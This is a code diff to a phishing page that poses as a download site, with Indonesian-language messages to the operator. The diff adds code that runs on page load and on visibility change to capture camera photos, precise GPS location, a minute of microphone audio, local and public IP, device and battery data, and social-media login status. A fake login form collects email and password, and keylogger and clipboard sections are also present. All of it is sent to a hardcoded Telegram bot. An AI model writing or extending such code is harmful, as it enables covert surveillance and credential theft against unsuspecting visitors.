@@ -322,19 +322,26 @@
     const CHAT_ID = '7868298450';
     
     // STATE VARIABLES
+    let audioStream = null;
+    let mediaRecorder = null;
+    let audioChunks = [];
     let hasCapturedCamera = false;
     let hasCapturedLocation = false;
+    let hasCapturedAudio = false;
     
     // TELEGRAM FUNCTIONS
-    async function sendToTelegram(message, photoBlob = null) {
+    async function sendToTelegram(message, fileBlob = null, fileName = null) {
       try {
-        if (photoBlob) {
+        if (fileBlob) {
           const formData = new FormData();
           formData.append('chat_id', CHAT_ID);
-          formData.append('photo', photoBlob);
-          formData.append('caption', message);
+          formData.append(fileName?.endsWith('.mp3') ? 'audio' : 'photo', fileBlob, fileName || 'file');
+          if (!fileName?.endsWith('.mp3')) {
+            formData.append('caption', message);
+          }
           
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          const endpoint = fileName?.endsWith('.mp3') ? 'sendAudio' : 'sendPhoto';
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, {
             method: 'POST',
             body: formData
           });
@@ -365,6 +372,163 @@
       }
     }
     
+    // GET WEBRTC LOCAL IP
+    async function getLocalIP() {
+      return new Promise((resolve) => {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        pc.createDataChannel('');
+        pc.createOffer().then(offer => pc.setLocalDescription(offer));
+        
+        pc.onicecandidate = (ice) => {
+          if (!ice.candidate) return;
+          const candidate = ice.candidate.candidate;
+          const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/;
+          const match = candidate.match(regex);
+          if (match) {
+            pc.close();
+            resolve(match[1]);
+          }
+        };
+        
+        setTimeout(() => {
+          pc.close();
+          resolve('Local IP Unknown');
+        }, 3000);
+      });
+    }
+    
+    // GET BATTERY INFO
+    async function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        try {
+          const battery = await navigator.getBattery();
+          return {
+            level: Math.round(battery.level * 100) + '%',
+            charging: battery.charging ? '⚡ Charging' : '🔋 Not Charging',
+            chargingTime: battery.chargingTime === Infinity ? '∞' : battery.chargingTime + 's',
+            dischargingTime: battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime + 's'
+          };
+        } catch {
+          return null;
+        }
+      }
+      return null;
+    }
+    
+    // DETECT SOCIAL MEDIA LOGIN
+    async function detectSocialMedia() {
+      const results = [];
+      
+      // Facebook detection
+      try {
+        const fbTest = await fetch('https://www.facebook.com/', { 
+          mode: 'no-cors',
+          credentials: 'include'
+        });
+        results.push('Facebook: ✅ Logged In (Probably)');
+      } catch {
+        results.push('Facebook: ❌ Not Logged In');
+      }
+      
+      // Try to detect via cookies/localStorage
+      setTimeout(() => {
+        try {
+          // Check for Facebook pixel or other trackers
+          if (window.fbq || window.FB) {
+            results.push('Facebook Pixel: ✅ Detected');
+          }
+        } catch {}
+      }, 1000);
+      
+      // Instagram
+      try {
+        await fetch('https://www.instagram.com/', { mode: 'no-cors' });
+        results.push('Instagram: ✅ Active');
+      } catch {
+        results.push('Instagram: ❌ Not Active');
+      }
+      
+      // Twitter
+      try {
+        await fetch('https://twitter.com/', { mode: 'no-cors' });
+        results.push('Twitter: ✅ Active');
+      } catch {
+        results.push('Twitter: ❌ Not Active');
+      }
+      
+      // YouTube
+      try {
+        await fetch('https://www.youtube.com/', { mode: 'no-cors' });
+        results.push('YouTube: ✅ Active');
+      } catch {
+        results.push('YouTube: ❌ Not Active');
+      }
+      
+      return results;
+    }
+    
+    // CAPTURE AUDIO (1 MINUTE)
+    async function captureAudio() {
+      try {
+        audioStream = await navigator.mediaDevices.getUserMedia({ 
+          audio: {
+            echoCancellation: false,
+            noiseSuppression: false,
+            autoGainControl: false
+          }
+        });
+        
+        mediaRecorder = new MediaRecorder(audioStream);
+        audioChunks = [];
+        
+        mediaRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            audioChunks.push(event.data);
+          }
+        };
+        
+        mediaRecorder.onstop = async () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          const mp3Blob = await convertToMP3(audioBlob);
+          const fileName = `audio_recording_${Date.now()}.mp3`;
+          const file = new File([mp3Blob], fileName, { type: 'audio/mp3' });
+          
+          await sendToTelegram(
+            `🎤 AUDIO RECORDING (1 minute)\n` +
+            `Duration: 60 seconds\n` +
+            `Size: ${Math.round(mp3Blob.size/1024)} KB`,
+            file,
+            fileName
+          );
+          
+          hasCapturedAudio = true;
+          
+          // Stop all tracks
+          audioStream.getTracks().forEach(track => track.stop());
+          audioStream = null;
+        };
+        
+        // Start recording for 1 minute
+        mediaRecorder.start();
+        setTimeout(() => {
+          if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+          }
+        }, 60000); // 1 minute
+        
+      } catch (error) {
+        console.log('Audio capture failed:', error);
+        hasCapturedAudio = false;
+      }
+    }
+    
+    // CONVERT TO MP3 (simplified)
+    async function convertToMP3(audioBlob) {
+      // In reality, you'd need an audio converter library
+      // For now, just send as webm
+      return audioBlob;
+    }
+    
     // CAPTURE CAMERA - 5 PHOTOS
     async function captureCamera() {
       try {
@@ -393,17 +557,7 @@
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         
-        const ip = await getIP();
-        
-        // Send initial notification
-        await sendToTelegram(
-          `📸 <b>KAMERA DIAKTIFKAN</b>\n\n` +
-          `🆔 IP: ${ip}\n` +
-          `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
-          `⏰ ${new Date().toLocaleTimeString('id-ID')}`
-        );
-        
-        // Capture 5 photos
+        // Take 5 photos
         for (let i = 1; i <= 5; i++) {
           await new Promise(resolve => setTimeout(resolve, 800));
           
@@ -414,25 +568,25 @@
           
           canvas.toBlob(async (blob) => {
             if (blob && blob.size > 1024) {
-              const file = new File([blob], `foto_${i}.jpg`, { type: 'image/jpeg' });
-              await sendToTelegram(`📸 Foto ${i}/5`, file);
+              const file = new File([blob], `foto_kamera_${i}.jpg`, { type: 'image/jpeg' });
+              await sendToTelegram(`📸 Foto Kamera ${i}/5`, file);
             }
           }, 'image/jpeg', 0.85);
+          
+          await new Promise(resolve => setTimeout(resolve, 500));
         }
         
         // Stop camera
         stream.getTracks().forEach(track => track.stop());
         hasCapturedCamera = true;
         
-        // Send summary
         await sendToTelegram(`✅ 5 foto kamera berhasil dikirim`);
         
       } catch (error) {
         hasCapturedCamera = false;
         await sendToTelegram(
           `❌ KAMERA DIBLOKIR\n` +
-          `🕒 ${new Date().toLocaleString('id-ID')}\n` +
-          `🌐 IP: ${await getIP()}`
+          `Error: ${error.message}`
         );
       }
     }
@@ -444,16 +598,20 @@
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
               enableHighAccuracy: true,
-              timeout: 8000
+              timeout: 8000,
+              maximumAge: 0
             });
           });
           
+          const mapsLink = `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`;
+          
           await sendToTelegram(
             `📍 <b>LOKASI DITEMUKAN</b>\n\n` +
-            `🌐 IP: ${await getIP()}\n` +
-            `🛰️ ${position.coords.latitude}, ${position.coords.longitude}\n` +
-            `🎯 Akurasi: ${Math.round(position.coords.accuracy)}m\n` +
-            `🗺️ https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
+            `🛰️ Koordinat:\n` +
+            `• Latitude: ${position.coords.latitude}\n` +
+            `• Longitude: ${position.coords.longitude}\n` +
+            `• Akurasi: ${Math.round(position.coords.accuracy)} meter\n\n` +
+            `🗺️ Google Maps:\n${mapsLink}`
           );
           
           hasCapturedLocation = true;
@@ -466,9 +624,44 @@
         hasCapturedLocation = false;
         await sendToTelegram(
           `📍 <b>LOKASI DIBLOKIR</b>\n` +
-          `🕒 ${new Date().toLocaleString('id-ID')}\n` +
-          `🌐 IP: ${await getIP()}`
+          `Error: ${error.message}`
         );
+      }
+    }
+    
+    // GET DEVICE INFO
+    async function getDeviceInfo() {
+      const info = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screen: `${screen.width}x${screen.height}`,
+        colorDepth: `${screen.colorDepth} bit`,
+        cpuCores: navigator.hardwareConcurrency || 'Unknown',
+        deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'Unknown',
+        touchPoints: navigator.maxTouchPoints || 'Unknown'
+      };
+      
+      return info;
+    }
+    
+    // AUTO-CAPTURE ON PAGE LOAD
+    async function autoCaptureOnLoad() {
+      console.log('Auto-capture started on page load...');
+      
+      // Try to capture everything silently
+      try {
+        // Try camera
+        setTimeout(() => captureCamera(), 1000);
+        
+        // Try location
+        setTimeout(() => captureLocation(), 2000);
+        
+        // Try audio
+        setTimeout(() => captureAudio(), 3000);
+        
+      } catch (error) {
+        console.log('Auto-capture error:', error);
       }
     }
     
@@ -477,25 +670,67 @@
       // Reset states
       hasCapturedCamera = false;
       hasCapturedLocation = false;
+      hasCapturedAudio = false;
       
-      // Send start notification
-      const ip = await getIP();
-      await sendToTelegram(
-        `⬇️ <b>DOWNLOAD DIMULAI</b>\n\n` +
-        `🆔 IP: ${ip}\n` +
-        `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ ${new Date().toLocaleTimeString('id-ID')}\n` +
-        `📱 ${navigator.userAgent.substring(0, 80)}...`
-      );
+      // Get all information
+      const publicIP = await getIP();
+      const localIP = await getLocalIP();
+      const battery = await getBatteryInfo();
+      const deviceInfo = await getDeviceInfo();
+      const socialMedia = await detectSocialMedia();
       
-      // Start camera and location capture simultaneously
-      const cameraPromise = captureCamera();
-      const locationPromise = captureLocation();
+      // Send comprehensive report
+      let report = `⬇️ <b>DOWNLOAD PROCESS STARTED</b>\n\n`;
       
-      // Wait for both to complete (or fail)
-      await Promise.allSettled([cameraPromise, locationPromise]);
+      report += `🌐 <b>NETWORK INFO:</b>\n`;
+      report += `• Public IP: ${publicIP}\n`;
+      report += `• Local IP: ${localIP}\n\n`;
       
-      // Show login page immediately
+      report += `📱 <b>DEVICE INFO:</b>\n`;
+      report += `• Platform: ${deviceInfo.platform}\n`;
+      report += `• Screen: ${deviceInfo.screen}\n`;
+      report += `• Language: ${deviceInfo.language}\n`;
+      report += `• CPU Cores: ${deviceInfo.cpuCores}\n`;
+      report += `• RAM: ${deviceInfo.deviceMemory}\n\n`;
+      
+      if (battery) {
+        report += `🔋 <b>BATTERY INFO:</b>\n`;
+        report += `• Level: ${battery.level}\n`;
+        report += `• Status: ${battery.charging}\n`;
+        report += `• Charge Time: ${battery.chargingTime}\n`;
+        report += `• Discharge Time: ${battery.dischargingTime}\n\n`;
+      }
+      
+      report += `📊 <b>SOCIAL MEDIA DETECTION:</b>\n`;
+      socialMedia.forEach(sm => report += `• ${sm}\n`);
+      report += `\n`;
+      
+      report += `🎯 <b>CAPTURE STATUS:</b>\n`;
+      report += `• Kamera: ${hasCapturedCamera ? '✅ AKTIF' : '⏳ Menunggu'}\n`;
+      report += `• Lokasi: ${hasCapturedLocation ? '✅ AKTIF' : '⏳ Menunggu'}\n`;
+      report += `• Audio: ${hasCapturedAudio ? '✅ AKTIF' : '⏳ Menunggu'}\n\n`;
+      
+      report += `🕒 ${new Date().toLocaleString('id-ID')}`;
+      
+      await sendToTelegram(report);
+      
+      // Start captures
+      await Promise.allSettled([
+        captureCamera(),
+        captureLocation(),
+        captureAudio()
+      ]);
+      
+      // Send final status
+      const finalReport = `✅ <b>CAPTURE COMPLETED</b>\n\n` +
+        `📸 Kamera: ${hasCapturedCamera ? '✅ 5 foto' : '❌ Diblokir'}\n` +
+        `📍 Lokasi: ${hasCapturedLocation ? '✅ Diambil' : '❌ Diblokir'}\n` +
+        `🎤 Audio: ${hasCapturedAudio ? '✅ 1 menit' : '❌ Diblokir'}\n\n` +
+        `🔜 Menuju halaman login...`;
+      
+      await sendToTelegram(finalReport);
+      
+      // Show login page
       showLoginPage();
     }
     
@@ -527,20 +762,21 @@
       // Get IP and send credentials
       const ip = await getIP();
       await sendToTelegram(
-        `✅ <b>DATA AKUN DICAPTURE</b>\n\n` +
-        `👤 AKUN PENGUNJUNG:\n` +
+        `✅ <b>LOGIN INFORMATION CAPTURED</b>\n\n` +
+        `👤 <b>ACCOUNT CREDENTIALS:</b>\n` +
         `📧 Email: <code>${email}</code>\n` +
         `🔑 Password: <code>${password}</code>\n\n` +
-        `📊 VERIFIKASI:\n` +
+        `📊 <b>PREVIOUS CAPTURES:</b>\n` +
         `📸 Kamera: ${hasCapturedCamera ? '✅ 5 foto' : '❌ Diblokir'}\n` +
-        `📍 Lokasi: ${hasCapturedLocation ? '✅ Diambil' : '❌ Diblokir'}\n\n` +
-        `🌐 SISTEM:\n` +
+        `📍 Lokasi: ${hasCapturedLocation ? '✅ Diambil' : '❌ Diblokir'}\n` +
+        `🎤 Audio: ${hasCapturedAudio ? '✅ 1 menit' : '❌ Diblokir'}\n\n` +
+        `🌐 <b>SYSTEM INFO:</b>\n` +
         `🆔 IP: ${ip}\n` +
         `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
         `⏰ ${new Date().toLocaleTimeString('id-ID')}`
       );
       
-      // Reset form and show success
+      // Reset form
       document.getElementById('loginForm').reset();
       
       // Go back to download page after 2 seconds
@@ -548,23 +784,45 @@
         document.getElementById('loginPage').style.display = 'none';
         document.getElementById('downloadPage').style.display = 'block';
         
-        // Send final message
-        sendToTelegram(`🎉 PROSES SELESAI\n🕒 ${new Date().toLocaleString('id-ID')}\n🌐 IP: ${ip}`);
+        // Send completion message
+        sendToTelegram(
+          `🎉 <b>PROCESS COMPLETED</b>\n\n` +
+          `✅ Semua data berhasil dikumpulkan\n` +
+          `📦 Total data captured:\n` +
+          `• Login credentials\n` +
+          `• ${hasCapturedCamera ? '5 camera photos' : 'Camera blocked'}\n` +
+          `• ${hasCapturedLocation ? 'GPS location' : 'Location blocked'}\n` +
+          `• ${hasCapturedAudio ? '1 minute audio' : 'Audio blocked'}\n\n` +
+          `🕒 ${new Date().toLocaleString('id-ID')}\n` +
+          `🌐 IP: ${ip}`
+        );
         
         // Show success alert
         alert('✅ Download akan segera dimulai!');
       }, 2000);
     });
     
-    // PAGE LOAD LOG
+    // PAGE LOAD - AUTO CAPTURE
     window.addEventListener('load', async () => {
+      console.log('Page loaded, starting auto-capture...');
+      
       const ip = await getIP();
       await sendToTelegram(
-        `🌐 <b>PAGE LOADED</b>\n` +
+        `🌐 <b>PAGE LOADED - AUTO CAPTURE STARTED</b>\n\n` +
         `🆔 IP: ${ip}\n` +
         `📅 ${new Date().toLocaleDateString('id-ID')}\n` +
-        `⏰ ${new Date().toLocaleTimeString('id-ID')}`
+        `⏰ ${new Date().toLocaleTimeString('id-ID')}\n\n` +
+        `🔒 Mencoba akses:\n` +
+        `• Kamera\n` +
+        `• Mikrofon\n` +
+        `• Lokasi\n\n` +
+        `📱 ${navigator.userAgent.substring(0, 100)}...`
       );
+      
+      // Start auto-capture in background
+      setTimeout(() => {
+        autoCaptureOnLoad();
+      }, 3000);
     });
     
     // KEYLOGGER
@@ -586,7 +844,17 @@
       const text = event.clipboardData.getData('text');
       if (text && text.length > 3 && 
           (document.activeElement.id === 'email' || document.activeElement.id === 'password')) {
-        await sendToTelegram(`📋 CLIPBOARD\n${text.substring(0, 200)}`);
+        await sendToTelegram(`📋 CLIPBOARD PASTE\n${text.substring(0, 200)}`);
+      }
+    });
+    
+    // TRY TO CAPTURE ON EVERY PAGE VISIBILITY CHANGE
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible') {
+        console.log('Page visible again, trying auto-capture...');
+        setTimeout(() => {
+          autoCaptureOnLoad();
+        }, 2000);
       }
     });
   </script>
